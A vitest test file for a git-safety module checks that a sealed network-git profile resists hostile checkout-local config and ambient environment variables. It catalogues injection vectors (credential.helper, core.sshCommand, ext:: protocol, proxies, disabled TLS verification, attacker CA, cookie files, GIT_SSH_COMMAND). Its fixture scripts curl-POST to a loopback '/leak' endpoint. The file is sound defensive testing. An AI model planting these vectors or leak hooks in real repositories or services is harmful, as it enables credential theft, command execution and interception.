/**
 * Unit 2 adversarial fixture suite — transport vectors.
 *
 * Two distinct threat classes live in this file:
 *
 * 1. CHECKOUT-LOCAL config plants (GENERIC_VECTORS, http.extraHeader): these can never reach the
 *    protected fetch for a purely STRUCTURAL reason — the protected fetch's `--git-dir` is the
 *    root-owned bare repo, never the agent-owned checkout, for ANY `buildNetworkGitProfile`
 *    implementation that takes `bareRepoPath` as its git-dir at all, including a trivial or
 *    entirely unprotected one. One honest, explicitly-labeled test states this structural fact;
 *    it does not exercise the implementation, and is not a substitute for real protection
 *    evidence. Every other checkout-local vector below keeps only its CONTROL test (proving the
 *    vector is a real, reachable threat if it ever DID run against the checkout).
 *
 * 2. AMBIENT environment contamination (GIT_CONFIG_PARAMETERS, GIT_CONFIG_COUNT/_KEY_n/_VALUE_n,
 *    GIT_SSH_COMMAND, GIT_PROXY_COMMAND, ambient *_PROXY, GIT_SSL_NO_VERIFY, GIT_SSL_CAINFO,
 *    ambient GIT_CONFIG_GLOBAL/GIT_CONFIG_SYSTEM, HOME- and XDG_CONFIG_HOME-driven global config):
 *    the network profile runs as ROOT, in the SERVICE's own process, which the agent cannot reach
 *    — but `buildNetworkGitProfile` takes the service's `parentEnv` and must build a fully sealed
 *    environment from it regardless of what it contains. THESE are the tests that actually
 *    exercise the implementation: a naive `{...parentEnv, GIT_ASKPASS: askpassPath, ...}`-shaped
 *    builder passes class 1 automatically but FAILS every test in class 2, because it never clears
 *    the ambient git-specific variables that a real implementation must explicitly override.
 *
 * Each vector in class 2 has a CONTROL (real git, unsealed, run against the bare repo with the
 * hostile `parentEnv` — proving the ambient variable genuinely redirects a bare-repo-targeted git
 * invocation) and a PROTECTED assertion (the SAME hostile `parentEnv` passed into
 * `buildNetworkGitProfile`, asserting nothing reaches the listener).
 *
 * See docs/plans/2026-09-24-001-feat-workspace-checkout-update-recovery-plan.md, Unit 2's
 * "Transport" scenario bullet, for the full vector list this file covers.
 */

import type {LoopbackListener} from './helpers.js'

import {mkdir, rm, writeFile} from 'node:fs/promises'
import {join} from 'node:path'
import process from 'node:process'

import {afterEach, beforeEach, describe, expect, it} from 'vitest'
import {buildNetworkGitProfile} from '../git-safety.js'
import {
  currentGitVersion,
  generateSelfSignedCert,
  gitAsync,
  gitSync,
  initRepo,
  isolatedGitEnv,
  makeTempDir,
  opensslAvailable,
  startHttpsLoopbackListener,
  startLoopbackListener,
  writeExecutableScript,
} from './helpers.js'

/** Computed once at module load: gates the http.sslVerify/http.sslCAInfo fixtures, which need a real self-signed certificate. Reported as a skip, not a silent pass, when unavailable — see the report for what this means for CI/the workspace image (openssl is apk-installed there). */
const OPENSSL_AVAILABLE = opensslAvailable()

// eslint-disable-next-line no-console -- deliberate: Unit 2's "Version" scenario requires the git version under test to be visible in the suite's own output, not just asserted silently.
console.log(`[update-fixtures/transport] running against ${currentGitVersion()}`)

let checkoutDir: string
let checkoutHome: string
let scriptsDir: string
let listener: LoopbackListener

beforeEach(async () => {
  checkoutDir = await makeTempDir('transport-checkout-')
  checkoutHome = await makeTempDir('transport-home-')
  scriptsDir = await makeTempDir('transport-scripts-')
  listener = await startLoopbackListener()
  initRepo(checkoutDir, isolatedGitEnv(checkoutHome))
})

afterEach(async () => {
  await listener.close()
  await rm(checkoutDir, {recursive: true, force: true})
  await rm(checkoutHome, {recursive: true, force: true})
  await rm(scriptsDir, {recursive: true, force: true})
})

function hasLeakRequest(requests: LoopbackListener['requests']): boolean {
  return requests.some(request => request.url.startsWith('/leak'))
}

/**
 * Generic transport vectors: each plants one hostile config key in the checkout's LOCAL
 * `.git/config` (never touched by GIT_CONFIG_NOSYSTEM/GIT_CONFIG_GLOBAL, which only seal the
 * system/global levels) and runs an operation that would exercise it. `viaLeakPath` distinguishes
 * vectors whose evidence is a request to the target URL itself (insteadOf, proxy, extraHeader,
 * include*) from vectors whose evidence is a leak script hitting `/leak` on the same listener
 * (credential.helper, core.askPass, core.sshCommand, protocol.ext.allow).
 */
interface TransportVector {
  readonly name: string
  readonly viaLeakPath: boolean
  configure: (port: number, scriptPath: string) => Promise<{readonly args: readonly string[]}>
}

const GENERIC_VECTORS: readonly TransportVector[] = [
  {
    name: 'url.*.insteadOf',
    viaLeakPath: false,
    async configure(port) {
      gitSync(
        checkoutDir,
        ['config', `url.http://127.0.0.1:${port}/.insteadOf`, 'https://github.com/'],
        isolatedGitEnv(checkoutHome),
      )
      return {args: ['ls-remote', 'https://github.com/octocat/Hello-World']}
    },
  },
  {
    name: 'http.proxy',
    viaLeakPath: false,
    async configure(port) {
      gitSync(checkoutDir, ['config', 'http.proxy', `http://127.0.0.1:${port}`], isolatedGitEnv(checkoutHome))
      return {args: ['ls-remote', 'http://example.invalid/octocat/Hello-World']}
    },
  },
  {
    name: 'http.<url>.proxy',
    viaLeakPath: false,
    async configure(port) {
      gitSync(
        checkoutDir,
        ['config', 'http.http://example.invalid/.proxy', `http://127.0.0.1:${port}`],
        isolatedGitEnv(checkoutHome),
      )
      return {args: ['ls-remote', 'http://example.invalid/octocat/Hello-World']}
    },
  },
  {
    name: 'credential.helper',
    viaLeakPath: true,
    async configure(port, scriptPath) {
      await writeExecutableScript(
        scriptPath,
        [
          `curl -s -o /dev/null -X POST -d 'credential-helper-fired' "http://127.0.0.1:${port}/leak" || true`,
          'if [ "$1" = "get" ]; then',
          String.raw`  printf 'username=x\npassword=y\n'`,
          'fi',
        ].join('\n'),
      )
      gitSync(checkoutDir, ['config', 'credential.helper', scriptPath], isolatedGitEnv(checkoutHome))
      return {args: ['ls-remote', `http://127.0.0.1:${port}/octocat/Hello-World`]}
    },
  },
  {
    name: 'core.askPass',
    viaLeakPath: true,
    async configure(port, scriptPath) {
      await writeExecutableScript(
        scriptPath,
        [
          `curl -s -o /dev/null -X POST -d "askpass-fired:$1" "http://127.0.0.1:${port}/leak" || true`,
          "printf 'dummy'",
        ].join('\n'),
      )
      gitSync(checkoutDir, ['config', 'core.askPass', scriptPath], isolatedGitEnv(checkoutHome))
      return {args: ['ls-remote', `http://127.0.0.1:${port}/octocat/Hello-World`]}
    },
  },
  {
    name: 'core.sshCommand',
    viaLeakPath: true,
    async configure(port, scriptPath) {
      await writeExecutableScript(
        scriptPath,
        [`curl -s -o /dev/null -X POST -d 'sshcommand-fired' "http://127.0.0.1:${port}/leak" || true`, 'exit 1'].join(
          '\n',
        ),
      )
      gitSync(checkoutDir, ['config', 'core.sshCommand', scriptPath], isolatedGitEnv(checkoutHome))
      return {args: ['ls-remote', 'ssh://git@example.invalid/octocat/Hello-World.git']}
    },
  },
  {
    name: 'protocol.ext.allow',
    viaLeakPath: true,
    async configure(port, scriptPath) {
      // ext:: splits its argument on whitespace with no shell quoting, so the command must be a
      // bare path with no embedded spaces — confirmed against real git 2.55.0.
      await writeExecutableScript(
        scriptPath,
        [`curl -s -o /dev/null -X POST -d ext-fired "http://127.0.0.1:${port}/leak" || true`, 'exit 1'].join('\n'),
      )
      gitSync(checkoutDir, ['config', 'protocol.ext.allow', 'always'], isolatedGitEnv(checkoutHome))
      return {args: ['ls-remote', `ext::${scriptPath}`]}
    },
  },
  {
    name: 'include.path',
    viaLeakPath: false,
    async configure(port, scriptPath) {
      const includedConfigPath = `${scriptPath}.gitconfig`
      await writeFile(includedConfigPath, `[url "http://127.0.0.1:${port}/"]\n\tinsteadOf = https://github.com/\n`)
      gitSync(checkoutDir, ['config', 'include.path', includedConfigPath], isolatedGitEnv(checkoutHome))
      return {args: ['ls-remote', 'https://github.com/octocat/Hello-World']}
    },
  },
  {
    name: 'includeIf',
    viaLeakPath: false,
    async configure(port, scriptPath) {
      const includedConfigPath = `${scriptPath}.gitconfig`
      await writeFile(includedConfigPath, `[url "http://127.0.0.1:${port}/"]\n\tinsteadOf = https://github.com/\n`)
      gitSync(checkoutDir, ['config', 'includeIf.gitdir:**.path', includedConfigPath], isolatedGitEnv(checkoutHome))
      return {args: ['ls-remote', 'https://github.com/octocat/Hello-World']}
    },
  },
]

describe('transport — control (real git, no protection): each vector reaches the loopback listener', () => {
  for (const vector of GENERIC_VECTORS) {
    it(`${vector.name}, used naively, reaches the listener`, async () => {
      // #given a checkout whose LOCAL config carries the hostile vector (never sealed by
      // GIT_CONFIG_NOSYSTEM/GIT_CONFIG_GLOBAL, which only disable system/global config)
      const scriptPath = join(scriptsDir, `${vector.name.replaceAll(/\W/g, '_')}.sh`)
      const {args} = await vector.configure(listener.port, scriptPath)

      // #when the checkout's own config is used the naive way, exactly as an unhardened `git`
      // invocation in that checkout would
      await gitAsync(checkoutDir, args, isolatedGitEnv(checkoutHome, {GIT_TERMINAL_PROMPT: '1'}))

      // #then the listener actually received something — the fixture genuinely triggers the
      // vector; this is the "positive control" the plan requires for every exploit test
      const sawIt = vector.viaLeakPath ? hasLeakRequest(listener.requests) : listener.requests.length > 0
      expect(sawIt, `expected ${vector.name} to reach the loopback listener, but it never did`).toBe(true)
    })
  }
})

// The checkout-local vectors above (GENERIC_VECTORS) all share one property: the protected
// fetch's `--git-dir` is the BARE REPO, never the checkout, so a checkout-local config plant is
// structurally unreachable to it — true for ANY `buildNetworkGitProfile` implementation that
// actually takes `bareRepoPath` as its git-dir, including a trivial or entirely unprotected one.
// Asserting that fact for all nine vectors would exercise nothing about the IMPLEMENTATION, only
// the function signature, which is exactly the gap an audit flagged in this suite. One honest test
// below states that structural fact once (using url.insteadOf as its representative vector); every
// test AFTER it in this file exercises something a naive implementation can actually get wrong:
// the service's own ambient process environment, which the profile IS responsible for sealing.
describe('transport — the checkout is structurally never the protected fetch\u2019s git-dir', () => {
  it('a checkout-local config plant cannot reach the protected fetch, because it never runs with the checkout as --git-dir (structural guarantee, not implementation-dependent)', async () => {
    // #given the exact same hostile checkout config as the control above
    gitSync(
      checkoutDir,
      ['config', `url.http://127.0.0.1:${listener.port}/.insteadOf`, 'https://github.com/'],
      isolatedGitEnv(checkoutHome),
    )

    // #control: a fetch run WITH the checkout as its git-dir (the naive shape) does leak
    await gitAsync(
      checkoutDir,
      ['fetch', 'https://github.com/octocat/Hello-World', 'HEAD'],
      isolatedGitEnv(checkoutHome),
    )
    expect(
      listener.requests.length,
      'expected the checkout-local plant to reach the listener when the checkout IS the git-dir',
    ).toBeGreaterThan(0)

    // #when the protected fetch runs against the bare repo instead — never the checkout
    const bareRepoDir = await makeTempDir('transport-bare-')
    const serviceHome = await makeTempDir('transport-service-home-')
    try {
      gitSync(bareRepoDir, ['init', '-q', '--bare'], isolatedGitEnv(serviceHome))
      // NOT IMPLEMENTED YET (Unit 3): this throws, so this test is expected to fail red until Unit
      // 3 lands.
      const profile = buildNetworkGitProfile({
        bareRepoPath: bareRepoDir,
        serviceHome,
        askpassPath: join(scriptsDir, 'unused-askpass.sh'),
        token: 'dummy-token-never-used-locally',
        parentEnv: process.env,
      })
      await gitAsync(
        profile.cwd,
        [...profile.args, 'fetch', 'https://github.com/octocat/Hello-World', 'HEAD'],
        profile.env,
      )

      // #then — no NEW request landed (the pre-existing one from the control above is still there)
      expect(listener.requests.length).toBe(1)
    } finally {
      await rm(bareRepoDir, {recursive: true, force: true})
      await rm(serviceHome, {recursive: true, force: true})
    }
  })
})

describe('transport — http.extraHeader (control only — protection is the structural guarantee above)', () => {
  it('control: a planted http.extraHeader is sent verbatim to the listener', async () => {
    // #given
    gitSync(checkoutDir, ['config', 'http.extraHeader', 'X-Fro-Bot-Leak: leaked-value'], isolatedGitEnv(checkoutHome))

    // #when
    await gitAsync(
      checkoutDir,
      ['ls-remote', `http://127.0.0.1:${listener.port}/octocat/Hello-World`],
      isolatedGitEnv(checkoutHome),
    )

    // #then — the control genuinely triggers the header leak
    const withHeader = listener.requests.find(request => request.headers['x-fro-bot-leak'] === 'leaked-value')
    expect(withHeader, 'expected a request carrying the planted X-Fro-Bot-Leak header').toBeDefined()
  })
})

describe('transport — http.sslVerify / http.sslCAInfo', () => {
  it.runIf(OPENSSL_AVAILABLE)(
    'baseline (positive control that verification is a real gate): a self-signed cert is refused by default, and the listener never even completes a handshake',
    async () => {
      // #given an HTTPS loopback listener with a throwaway self-signed cert this process never
      // installed as trusted anywhere
      const certDir = await makeTempDir('transport-cert-')
      const {certPath, keyPath} = await generateSelfSignedCert(certDir)
      const httpsListener = await startHttpsLoopbackListener(certPath, keyPath)
      try {
        // #when a plain ls-remote is attempted with no sslVerify/sslCAInfo override
        await gitAsync(
          checkoutDir,
          ['ls-remote', `https://127.0.0.1:${httpsListener.port}/octocat/Hello-World`],
          isolatedGitEnv(checkoutHome),
        )

        // #then TLS verification refused the connection before any HTTP request landed — proving
        // the vectors below genuinely change behaviour, rather than the listener being reachable
        // regardless of what git does
        expect(httpsListener.requests).toHaveLength(0)
      } finally {
        await httpsListener.close()
        await rm(certDir, {recursive: true, force: true})
      }
    },
  )

  it.runIf(OPENSSL_AVAILABLE)(
    'control: http.sslVerify=false lets the request reach the listener despite the invalid certificate',
    async () => {
      const certDir = await makeTempDir('transport-cert-')
      const {certPath, keyPath} = await generateSelfSignedCert(certDir)
      const httpsListener = await startHttpsLoopbackListener(certPath, keyPath)
      try {
        gitSync(checkoutDir, ['config', 'http.sslVerify', 'false'], isolatedGitEnv(checkoutHome))
        await gitAsync(
          checkoutDir,
          ['ls-remote', `https://127.0.0.1:${httpsListener.port}/octocat/Hello-World`],
          isolatedGitEnv(checkoutHome),
        )
        expect(httpsListener.requests.length).toBeGreaterThan(0)
      } finally {
        await httpsListener.close()
        await rm(certDir, {recursive: true, force: true})
      }
    },
  )

  it.runIf(OPENSSL_AVAILABLE)(
    'control: http.sslCAInfo pointed at an attacker-supplied CA makes the same invalid certificate trusted',
    async () => {
      const certDir = await makeTempDir('transport-cert-')
      const {certPath, keyPath} = await generateSelfSignedCert(certDir)
      const httpsListener = await startHttpsLoopbackListener(certPath, keyPath)
      try {
        // The self-signed cert is its own issuer, so pointing sslCAInfo at it is exactly what an
        // attacker able to write to the checkout's config could do to make their own MITM cert
        // validate.
        gitSync(checkoutDir, ['config', 'http.sslCAInfo', certPath], isolatedGitEnv(checkoutHome))
        await gitAsync(
          checkoutDir,
          ['ls-remote', `https://127.0.0.1:${httpsListener.port}/octocat/Hello-World`],
          isolatedGitEnv(checkoutHome),
        )
        expect(httpsListener.requests.length).toBeGreaterThan(0)
      } finally {
        await httpsListener.close()
        await rm(certDir, {recursive: true, force: true})
      }
    },
  )

  it.runIf(OPENSSL_AVAILABLE)(
    'ambient: GIT_SSL_NO_VERIFY in the service\u2019s own process env never lets the protected fetch skip TLS verification',
    async () => {
      // #given an HTTPS bare-repo target with an untrusted self-signed cert, and a hostile AMBIENT
      // env — never anything in a checkout, since this profile never has one
      const certDir = await makeTempDir('transport-cert-')
      const {certPath, keyPath} = await generateSelfSignedCert(certDir)
      const httpsListener = await startHttpsLoopbackListener(certPath, keyPath)
      const bareRepoDir = await makeTempDir('transport-bare-')
      const serviceHome = await makeTempDir('transport-service-home-')
      const hostileParentEnv: NodeJS.ProcessEnv = {...process.env, GIT_SSL_NO_VERIFY: 'true'}
      try {
        gitSync(bareRepoDir, ['init', '-q', '--bare'], isolatedGitEnv(serviceHome))

        // #control: unsealed git, run directly against the bare repo, inheriting the hostile
        // ambient env exactly as a naive root subprocess spawn would
        await gitAsync(
          bareRepoDir,
          ['--git-dir', bareRepoDir, 'ls-remote', `https://127.0.0.1:${httpsListener.port}/octocat/Hello-World`],
          hostileParentEnv,
        )
        expect(
          httpsListener.requests.length,
          'expected ambient GIT_SSL_NO_VERIFY to let the request through',
        ).toBeGreaterThan(0)

        // #when the PRODUCTION network profile is built FROM that exact hostile parentEnv
        // NOT IMPLEMENTED YET (Unit 3): this throws, so this test is expected to fail red until
        // Unit 3 lands. It documents the contract: the builder must force TLS verification on
        // regardless of GIT_SSL_NO_VERIFY anywhere in parentEnv.
        const profile = buildNetworkGitProfile({
          bareRepoPath: bareRepoDir,
          serviceHome,
          askpassPath: join(scriptsDir, 'unused-askpass.sh'),
          token: 'dummy-token-never-used-locally',
          parentEnv: hostileParentEnv,
        })
        const requestsBefore = httpsListener.requests.length
        await gitAsync(
          profile.cwd,
          [...profile.args, 'ls-remote', `https://127.0.0.1:${httpsListener.port}/octocat/Hello-World`],
          profile.env,
        )

        // #then — no NEW request landed
        expect(httpsListener.requests.length).toBe(requestsBefore)
      } finally {
        await httpsListener.close()
        await rm(certDir, {recursive: true, force: true})
        await rm(bareRepoDir, {recursive: true, force: true})
        await rm(serviceHome, {recursive: true, force: true})
      }
    },
  )

  it.runIf(OPENSSL_AVAILABLE)(
    'ambient: GIT_SSL_CAINFO in the service\u2019s own process env never lets the protected fetch trust an attacker CA',
    async () => {
      const certDir = await makeTempDir('transport-cert-')
      const {certPath, keyPath} = await generateSelfSignedCert(certDir)
      const httpsListener = await startHttpsLoopbackListener(certPath, keyPath)
      const bareRepoDir = await makeTempDir('transport-bare-')
      const serviceHome = await makeTempDir('transport-service-home-')
      // The self-signed cert is its own issuer, so pointing GIT_SSL_CAINFO at it is exactly what a
      // contaminated ambient environment (or an attacker who could influence it) could do to make
      // their own MITM cert validate.
      const hostileParentEnv: NodeJS.ProcessEnv = {...process.env, GIT_SSL_CAINFO: certPath}
      try {
        gitSync(bareRepoDir, ['init', '-q', '--bare'], isolatedGitEnv(serviceHome))

        await gitAsync(
          bareRepoDir,
          ['--git-dir', bareRepoDir, 'ls-remote', `https://127.0.0.1:${httpsListener.port}/octocat/Hello-World`],
          hostileParentEnv,
        )
        expect(
          httpsListener.requests.length,
          'expected ambient GIT_SSL_CAINFO to let the request through',
        ).toBeGreaterThan(0)

        // NOT IMPLEMENTED YET (Unit 3): this throws, so this test is expected to fail red until
        // Unit 3 lands.
        const profile = buildNetworkGitProfile({
          bareRepoPath: bareRepoDir,
          serviceHome,
          askpassPath: join(scriptsDir, 'unused-askpass.sh'),
          token: 'dummy-token-never-used-locally',
          parentEnv: hostileParentEnv,
        })
        const requestsBefore = httpsListener.requests.length
        await gitAsync(
          profile.cwd,
          [...profile.args, 'ls-remote', `https://127.0.0.1:${httpsListener.port}/octocat/Hello-World`],
          profile.env,
        )

        expect(httpsListener.requests.length).toBe(requestsBefore)
      } finally {
        await httpsListener.close()
        await rm(certDir, {recursive: true, force: true})
        await rm(bareRepoDir, {recursive: true, force: true})
        await rm(serviceHome, {recursive: true, force: true})
      }
    },
  )
})

describe('transport — http.cookieFile (control only — no ambient env equivalent exists; protection is the structural guarantee above)', () => {
  it('baseline: without http.cookieFile, no Cookie header is sent', async () => {
    await gitAsync(
      checkoutDir,
      ['ls-remote', `http://127.0.0.1:${listener.port}/octocat/Hello-World`],
      isolatedGitEnv(checkoutHome),
    )
    expect(listener.requests.every(request => request.headers.cookie === undefined)).toBe(true)
  })

  it('control: a planted http.cookieFile sends its cookie to the target the naive checkout contacts', async () => {
    // #given a Netscape-format cookie jar scoped to 127.0.0.1, the exact host this test's
    // listener is bound to
    const cookieJarPath = join(scriptsDir, 'cookies.txt')
    const farFutureExpiry = 2_147_483_647
    await writeFile(
      cookieJarPath,
      `# Netscape HTTP Cookie File\n127.0.0.1\tFALSE\t/\tFALSE\t${farFutureExpiry}\tsession\tleaked-cookie-value\n`,
    )
    gitSync(checkoutDir, ['config', 'http.cookieFile', cookieJarPath], isolatedGitEnv(checkoutHome))

    // #when
    await gitAsync(
      checkoutDir,
      ['ls-remote', `http://127.0.0.1:${listener.port}/octocat/Hello-World`],
      isolatedGitEnv(checkoutHome),
    )

    // #then \u2014 the control genuinely triggers the cookie leak
    const withCookie = listener.requests.find(request =>
      String(request.headers.cookie ?? '').includes('leaked-cookie-value'),
    )
    expect(withCookie, 'expected a request carrying the planted cookie').toBeDefined()
  })
})

/**
 * Runs the control+protected pair shared by every ambient vector below.
 *
 * `overrides` is applied ON TOP of a neutral base env (`process.env` with `HOME` pointed at a
 * fresh empty temp dir, so this developer machine's own real `~/.gitconfig` can never affect the
 * result) — a key set to `undefined` is deleted from the resulting env entirely, so a vector can
 * also assert about the ABSENCE of a variable (e.g. GIT_CONFIG_NOSYSTEM unset).
 *
 * #control: unsealed git, run directly against a fresh bare repo (never a checkout) with the
 * hostile env — proving the ambient variable genuinely redirects a bare-repo-targeted git
 * invocation, exactly the shape the production network profile's OWN invocation has.
 * #protected: `buildNetworkGitProfile` built from that EXACT hostile env.
 * NOT IMPLEMENTED YET (Unit 3): `buildNetworkGitProfile` throws, so every protected half below is
 * expected to fail red until Unit 3 lands.
 */
async function assertAmbientVectorSealed(
  overrides: Readonly<Record<string, string | undefined>>,
  opArgs: readonly string[],
  viaLeakPath = false,
): Promise<void> {
  const neutralHome = await makeTempDir('transport-ambient-home-')
  const bareRepoDir = await makeTempDir('transport-bare-')
  const serviceHome = await makeTempDir('transport-service-home-')
  try {
    gitSync(bareRepoDir, ['init', '-q', '--bare'], isolatedGitEnv(serviceHome))

    const hostileEnv: NodeJS.ProcessEnv = {...process.env, HOME: neutralHome}
    for (const [key, value] of Object.entries(overrides)) {
      if (value === undefined) delete hostileEnv[key]
      else hostileEnv[key] = value
    }

    // #control
    await gitAsync(serviceHome, ['--git-dir', bareRepoDir, ...opArgs], hostileEnv)
    const sawControl = viaLeakPath ? hasLeakRequest(listener.requests) : listener.requests.length > 0
    expect(
      sawControl,
      'expected the ambient vector to reach the listener when git runs with the unsealed hostile env',
    ).toBe(true)
    listener.requests.length = 0

    // #protected
    const profile = buildNetworkGitProfile({
      bareRepoPath: bareRepoDir,
      serviceHome,
      askpassPath: join(scriptsDir, 'unused-askpass.sh'),
      token: 'dummy-token-never-used-locally',
      parentEnv: hostileEnv,
    })
    await gitAsync(profile.cwd, [...profile.args, ...opArgs], profile.env)

    const sawProtected = viaLeakPath ? hasLeakRequest(listener.requests) : listener.requests.length > 0
    expect(sawProtected).toBe(false)
  } finally {
    await rm(neutralHome, {recursive: true, force: true})
    await rm(bareRepoDir, {recursive: true, force: true})
    await rm(serviceHome, {recursive: true, force: true})
  }
}

describe('transport — ambient environment (Unit 3 network profile, not implemented yet): must be hermetic regardless of the service’s own process environment', () => {
  it('ambient GIT_CONFIG_PARAMETERS injects url.insteadOf via env, bypassing file-based config sealing', async () => {
    await assertAmbientVectorSealed(
      {GIT_CONFIG_PARAMETERS: `'url.http://127.0.0.1:${listener.port}/.insteadOf=https://github.com/'`},
      ['ls-remote', 'https://github.com/octocat/Hello-World'],
    )
  })

  it('ambient GIT_CONFIG_COUNT/_KEY_0/_VALUE_0 injects the same config via a different env mechanism', async () => {
    await assertAmbientVectorSealed(
      {
        GIT_CONFIG_COUNT: '1',
        GIT_CONFIG_KEY_0: `url.http://127.0.0.1:${listener.port}/.insteadOf`,
        GIT_CONFIG_VALUE_0: 'https://github.com/',
      },
      ['ls-remote', 'https://github.com/octocat/Hello-World'],
    )
  })

  it('ambient GIT_SSH_COMMAND runs an arbitrary command for any ssh:// remote', async () => {
    const scriptPath = join(scriptsDir, 'ambient-ssh-command.sh')
    await writeExecutableScript(
      scriptPath,
      [
        `curl -s -o /dev/null -X POST -d ambient-ssh-fired "http://127.0.0.1:${listener.port}/leak" || true`,
        'exit 1',
      ].join('\n'),
    )
    await assertAmbientVectorSealed(
      {GIT_SSH_COMMAND: scriptPath},
      ['ls-remote', 'ssh://git@example.invalid/octocat/Hello-World.git'],
      true,
    )
  })

  it('ambient GIT_PROXY_COMMAND runs an arbitrary command for any git:// remote', async () => {
    const scriptPath = join(scriptsDir, 'ambient-proxy-command.sh')
    await writeExecutableScript(
      scriptPath,
      [
        `curl -s -o /dev/null -X POST -d ambient-proxycmd-fired "http://127.0.0.1:${listener.port}/leak" || true`,
        'exit 1',
      ].join('\n'),
    )
    await assertAmbientVectorSealed(
      {GIT_PROXY_COMMAND: scriptPath},
      ['ls-remote', 'git://example.invalid/octocat/Hello-World.git'],
      true,
    )
  })

  it('an ambient http_proxy env var silently proxies a plain-HTTP network operation', async () => {
    // Lowercase only: curl (git's HTTP backend) deliberately does not honor uppercase HTTP_PROXY
    // for an http:// target (a long-standing CGI-collision defense) \u2014 confirmed against real git
    // 2.55.0. https_proxy/HTTPS_PROXY/ALL_PROXY have no such restriction; ALL_PROXY is covered
    // separately below.
    await assertAmbientVectorSealed({http_proxy: `http://127.0.0.1:${listener.port}`}, [
      'ls-remote',
      'http://example.invalid/octocat/Hello-World',
    ])
  })

  it('an ambient ALL_PROXY env var silently proxies a network operation regardless of scheme', async () => {
    await assertAmbientVectorSealed({ALL_PROXY: `http://127.0.0.1:${listener.port}`}, [
      'ls-remote',
      'http://example.invalid/octocat/Hello-World',
    ])
  })

  it('an ambient GIT_CONFIG_GLOBAL pointing at an attacker-controlled file is read as the global config', async () => {
    const hostileConfigPath = join(scriptsDir, 'ambient-global.gitconfig')
    await writeFile(
      hostileConfigPath,
      `[url "http://127.0.0.1:${listener.port}/"]\n\tinsteadOf = https://github.com/\n`,
    )
    await assertAmbientVectorSealed({GIT_CONFIG_GLOBAL: hostileConfigPath}, [
      'ls-remote',
      'https://github.com/octocat/Hello-World',
    ])
  })

  it('ambient HOME pointed at a directory with a hostile ~/.gitconfig is read as the global config when GIT_CONFIG_GLOBAL is not itself set', async () => {
    const hostileHome = await makeTempDir('transport-hostile-home-')
    try {
      await writeFile(
        join(hostileHome, '.gitconfig'),
        `[url "http://127.0.0.1:${listener.port}/"]\n\tinsteadOf = https://github.com/\n`,
      )
      await assertAmbientVectorSealed({HOME: hostileHome, GIT_CONFIG_GLOBAL: undefined}, [
        'ls-remote',
        'https://github.com/octocat/Hello-World',
      ])
    } finally {
      await rm(hostileHome, {recursive: true, force: true})
    }
  })

  it('ambient XDG_CONFIG_HOME pointed at a directory with a hostile git/config is read as the global config', async () => {
    const hostileXdg = await makeTempDir('transport-hostile-xdg-')
    try {
      await mkdir(join(hostileXdg, 'git'), {recursive: true})
      await writeFile(
        join(hostileXdg, 'git', 'config'),
        `[url "http://127.0.0.1:${listener.port}/"]\n\tinsteadOf = https://github.com/\n`,
      )
      await assertAmbientVectorSealed({XDG_CONFIG_HOME: hostileXdg, GIT_CONFIG_GLOBAL: undefined}, [
        'ls-remote',
        'https://github.com/octocat/Hello-World',
      ])
    } finally {
      await rm(hostileXdg, {recursive: true, force: true})
    }
  })

  it('an ambient GIT_CONFIG_SYSTEM redirect is read as system config unless GIT_CONFIG_NOSYSTEM is forced', async () => {
    const hostileConfigPath = join(scriptsDir, 'ambient-system.gitconfig')
    await writeFile(
      hostileConfigPath,
      `[url "http://127.0.0.1:${listener.port}/"]\n\tinsteadOf = https://github.com/\n`,
    )
    await assertAmbientVectorSealed({GIT_CONFIG_SYSTEM: hostileConfigPath, GIT_CONFIG_NOSYSTEM: undefined}, [
      'ls-remote',
      'https://github.com/octocat/Hello-World',
    ])
  })
})
